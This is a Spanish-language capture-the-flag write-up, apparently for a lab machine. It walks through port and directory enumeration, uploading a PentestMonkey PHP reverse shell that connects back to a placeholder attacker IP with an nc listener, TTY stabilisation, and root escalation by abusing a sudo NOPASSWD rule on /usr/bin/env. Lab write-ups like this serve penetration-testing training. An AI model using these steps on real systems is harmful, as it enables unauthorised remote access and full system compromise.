## 1. Reconocimiento y Enumeración Inicial

### 1.1. Escaneo con Nmap

Iniciamos la auditoría realizando un escaneo de puertos y servicios para identificar la superficie de ataque del servidor objetivo.

```bash
nmap -O -sC -sV <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `80/tcp open http Apache` El título de la página (`Upload here your file`) es una pista clara sobre la funcionalidad principal del sitio.

![[Upload_SubirArchivo.png]]
### 1.2. Perfilado Tecnológico (WhatWeb)

Para obtener mayor detalle sobre el entorno, ejecutamos `whatweb`.

```Bash
whatweb http://<IP_DEL_OBJETIVO>
```

- **Resultado:** Confirma el uso de Apache/2.4.52 corriendo sobre un sistema operativo Ubuntu Linux.

### 1.3. Fuzzing Web con Gobuster

Realizamos un fuzzing de directorios con `gobuster` para descubrir rutas ocultas o archivos interesantes en el servidor web. Esto nos ayuda a mapear la estructura del sitio y encontrar posibles puntos de entrada.

```bash
gobuster dir -w /path/to/wordlist/directory-list-lowercase-2.3-medium.txt -u http://<IP_DEL_OBJETIVO>
```

**Resultados Relevantes:**

*   `/uploads`: Este directorio es crucial, ya que su nombre sugiere que es donde se almacenan los archivos subidos.

## 2. Explotación de la Vulnerabilidad de Carga de Archivos

La presencia de una funcionalidad de carga de archivos y un directorio `/uploads` accesible es una señal de una posible vulnerabilidad de carga de archivos sin restricciones, que puede llevar a la ejecución remota de código (RCE).

### 2.1. Preparación del Payload (Reverse Shell)

Dado que el servidor ejecuta PHP, preparamos un script malicioso en este lenguaje (como la Reverse Shell de PentestMonkey). Modificamos los parámetros internos del script para que apunten a nuestra máquina atacante:
- `$ip = '<IP_ATACANTE>'`
- `$port = 443`
Guardamos el archivo como `reverseShell.php`.

### 2.2. Subida y Ejecución

1. Accedemos a la interfaz principal y subimos el archivo reverseShell.php. La aplicación confirma la recepción con el mensaje: _"The file reverseShell.php has been uploaded"_. Esto confirma la ausencia de filtros restrictivos.

2. En nuestra máquina atacante, preparamos un _listener_ en el puerto definido:

```Bash
nc -nlvp 443
```
  
3. Navegamos hacia el directorio descubierto anteriormente para ejecutar el script: `http://<IP_DEL_OBJETIVO>/uploads/reverseShell.php`

### 2.3. Acceso Inicial y Estabilización (TTY)

Al invocar la URL, el servidor interpreta el código PHP y nos devuelve una conexión interactiva (_Reverse Shell_).

```Bash
whoami
# www-data
```

Para asegurar la persistencia y comodidad de la sesión (evitando que se cierre accidentalmente con atajos de teclado y habilitando el autocompletado), realizamos el tratamiento de la TTY:

```Bash
script /dev/null -c bash
# [Ctrl + Z] para suspender
stty raw -echo; fg
reset
export TERM=xterm
export SHELL=bash
```

## 3. Escalada de Privilegios

Una vez que tenemos una shell como `www-data`, el objetivo es escalar privilegios a `root`.

### 3.1. Enumeración de Sudoers

Revisamos las políticas de ejecución privilegiada asignadas a nuestro usuario:

```Bash
sudo -l
```

**Resultado:**

```
User www-data may run the following commands on upload:
    (root) NOPASSWD: /usr/bin/env
```

### 3.2. Abuso de env

El sistema está mal configurado, permitiendo al usuario `www-data` ejecutar el binario `/usr/bin/env` como `root` sin requerir contraseña.

**Análisis de la Vulnerabilidad:** El comando `env` se utiliza para ejecutar un programa en un entorno modificado. Usando **GTFOBins**, comprobamos que, si `env` puede ser invocado mediante `sudo`, es posible utilizarlo para lanzar un intérprete de comandos (`/bin/sh` o `/bin/bash`). Como el contexto de ejecución original pertenece a `sudo`, la nueva shell heredará los privilegios del superusuario.

**Ejecución del Exploit:** Lanzamos una shell interactiva a través de `env`:

```Bash
sudo /usr/bin/env /bin/sh
```

Verificamos el compromiso total del sistema:

```Bash
whoami
# root
```
